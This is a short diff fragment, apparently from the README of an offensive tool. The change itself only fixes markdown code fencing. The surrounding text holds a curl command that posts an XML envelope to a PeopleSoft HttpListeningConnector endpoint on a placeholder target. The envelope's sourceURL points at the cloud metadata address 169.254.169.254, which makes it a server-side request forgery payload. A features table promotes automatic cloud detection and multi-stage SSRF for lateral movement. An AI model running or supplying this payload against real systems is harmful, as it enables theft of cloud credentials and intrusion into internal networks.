@@ -16,7 +16,8 @@ curl -k -X POST https://target.com/PSIGW/HttpListeningConnector \
   -d '<Envelope><Body><EnvironmentManagement><sourceURL>http://169.254.169.254/latest/meta-data/</sourceURL></EnvironmentManagement></Body></Envelope>'
 ```
 Features and	Why they Matter
-``
+
+```
 Auto cloud detection	Works on AWS, Azure, GCP, or on‑prem without modification
 
 Multi‑stage SSRF	Probes internal services for lateral movement
